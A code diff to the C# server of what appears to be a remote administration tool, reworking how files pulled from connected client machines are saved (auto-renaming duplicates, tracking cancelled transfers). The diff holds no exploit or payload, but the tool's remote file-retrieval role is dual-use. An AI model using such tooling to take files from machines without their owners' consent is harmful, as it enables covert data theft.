@@ -4,6 +4,7 @@ using System.Windows.Forms;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
+using xServer.Forms;
 
 namespace xServer.Core.Commands
 {
@@ -23,7 +24,7 @@ namespace xServer.Core.Commands
 
         public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
         {
-            if (string.IsNullOrEmpty(packet.Filename))
+            if (CanceledDownloads.ContainsKey(packet.ID) || string.IsNullOrEmpty(packet.Filename))
                 return;
 
             if (!Directory.Exists(client.Value.DownloadDirectory))
@@ -31,18 +32,27 @@ namespace xServer.Core.Commands
 
             string downloadPath = Path.Combine(client.Value.DownloadDirectory, packet.Filename);
 
-            bool Continue = true;
             if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
-                if (
-                    MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename),
-                        "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
-                    Continue = false;
+            {
+                for (int i = 1; i < 100; i++)
+                {
+                    var newFileName = string.Format("{0}_{1}{2}", Path.GetFileNameWithoutExtension(downloadPath), i, Path.GetExtension(downloadPath));
+                    if (File.Exists(Path.Combine(client.Value.DownloadDirectory, newFileName))) continue;
+
+                    downloadPath = Path.Combine(client.Value.DownloadDirectory, newFileName);
+                    RenamedFiles.Add(packet.ID, newFileName);
+                    break;
+                }
+            }
+            else if (packet.CurrentBlock > 0 && File.Exists(downloadPath) && RenamedFiles.ContainsKey(packet.ID))
+            {
+                downloadPath = Path.Combine(client.Value.DownloadDirectory, RenamedFiles[packet.ID]);
+            }
 
             if (client.Value.FrmFm == null)
             {
+                FrmMain.Instance.SetClientStatus(client, "Download aborted, please keep the File Manager open.");
                 new Packets.ServerPackets.DownloadFileCanceled(packet.ID).Execute(client);
-                MessageBox.Show("Please keep the File Manager open.\n\nWarning: Download aborted", "Download aborted",
-                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 return;
             }
 
@@ -50,49 +60,40 @@ namespace xServer.Core.Commands
             if (index < 0)
                 return;
 
-            if (Continue)
+
+            if (!string.IsNullOrEmpty(packet.CustomMessage))
             {
-                if (!string.IsNullOrEmpty(packet.CustomMessage))
-                {
-                    if (client.Value.FrmFm == null) // abort download when form is closed
-                        return;
-
-                    client.Value.FrmFm.UpdateTransferStatus(index, packet.CustomMessage, 0);
-                    return;
-                }
-
-                FileSplit destFile = new FileSplit(downloadPath);
-                if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
-                {
-                    if (client.Value.FrmFm == null)
-                        return;
-
-                    client.Value.FrmFm.UpdateTransferStatus(index, destFile.LastError, 0);
-                    return;
-                }
-
-                decimal progress =
-                    Math.Round((decimal)((double)(packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);
-
-                if (client.Value.FrmFm == null)
+                if (client.Value.FrmFm == null) // abort download when form is closed
                     return;
 
-                client.Value.FrmFm.UpdateTransferStatus(index, string.Format("Downloading...({0}%)", progress), -1);
-
-                if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
-                {
-                    if (client.Value.FrmFm == null)
-                        return;
-
-                    client.Value.FrmFm.UpdateTransferStatus(index, "Completed", 1);
-                }
+                client.Value.FrmFm.UpdateTransferStatus(index, packet.CustomMessage, 0);
+                return;
             }
-            else
+
+            FileSplit destFile = new FileSplit(downloadPath);
+            if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
             {
                 if (client.Value.FrmFm == null)
                     return;
 
-                client.Value.FrmFm.UpdateTransferStatus(index, "Canceled", 0);
+                client.Value.FrmFm.UpdateTransferStatus(index, destFile.LastError, 0);
+                return;
+            }
+
+            decimal progress =
+                Math.Round((decimal) ((double) (packet.CurrentBlock + 1)/(double) packet.MaxBlocks*100.0), 2);
+
+            if (client.Value.FrmFm == null)
+                return;
+
+            client.Value.FrmFm.UpdateTransferStatus(index, string.Format("Downloading...({0}%)", progress), -1);
+
+            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
+            {
+                if (client.Value.FrmFm == null)
+                    return;
+                RenamedFiles.Remove(packet.ID);
+                client.Value.FrmFm.UpdateTransferStatus(index, "Completed", 1);
             }
         }
     }
